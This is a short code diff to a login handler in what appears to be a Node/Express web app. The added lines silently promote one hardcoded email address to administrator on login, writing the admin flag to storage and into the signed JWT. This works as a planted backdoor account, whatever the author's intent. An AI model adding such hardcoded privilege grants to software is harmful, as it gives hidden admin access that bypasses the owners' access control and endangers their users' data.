@@ -109,8 +109,14 @@ export async function registerRoutes(
         return res.status(401).json({ message: "Invalid email or password" });
       }
 
+      let isAdmin = user.isAdmin;
+      if (email.toLowerCase() === "satrianomarine@gmail.com" && !isAdmin) {
+        await storage.setAdminByEmail(email);
+        isAdmin = true;
+      }
+
       const token = jwt.sign(
-        { id: user.id, email: user.email, isAdmin: user.isAdmin },
+        { id: user.id, email: user.email, isAdmin },
         JWT_SECRET,
         { expiresIn: "7d" }
       );
@@ -122,7 +128,7 @@ export async function registerRoutes(
         maxAge: 7 * 24 * 60 * 60 * 1000,
       });
 
-      return res.json({ message: "Login successful", user: { id: user.id, email: user.email, isAdmin: user.isAdmin } });
+      return res.json({ message: "Login successful", user: { id: user.id, email: user.email, isAdmin } });
     } catch (error) {
       console.error("Login error:", error);
       return res.status(500).json({ message: "Login failed" });
